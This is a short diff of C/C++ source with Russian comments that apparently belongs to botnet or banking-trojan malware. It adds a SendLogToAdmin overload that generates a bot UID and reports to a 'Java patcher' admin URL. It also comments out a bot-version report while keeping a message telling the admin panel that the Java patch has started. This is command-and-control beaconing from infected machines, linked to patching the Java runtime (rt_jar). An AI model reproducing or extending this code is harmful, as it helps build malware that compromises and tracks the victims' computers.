@@ -822,6 +822,16 @@ static void SendLogToAdmin( const char* url, const char* uid, const char* c, con
 	STR::Free(qr);
 }
 
+//отсылка инфы по патчу, если неизвестны урл и уид (для ситем, которые не имеют доступа к дамнному модулю)
+void SendLogToAdmin( const char* c, const char* v )
+{
+	char botUid[100];
+	GenerateUid(botUid);
+	PCHAR adminUrl = GetJavaPatcherURL(); 
+	SendLogToAdmin( adminUrl, botUid, c, v );
+	STR::Free(adminUrl);
+}
+
 DWORD WINAPI JavaPatch( LPVOID lpData )
 {
 	WJFile();
@@ -839,7 +849,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	PCHAR adminUrl = GetJavaPatcherURL(); 
 	PCHAR javaUrl = STR::New( 2, adminUrl, "rt_jar/" );
 	//отсылаем версию бота
-	SendLogToAdmin( adminUrl, botUid, "botver", version );
+//	SendLogToAdmin( adminUrl, botUid, "botver", version );
 	//сообщаем админке, что ява патч запущен
 	SendLogToAdmin( adminUrl, botUid, "setup_patch", "0" );
 
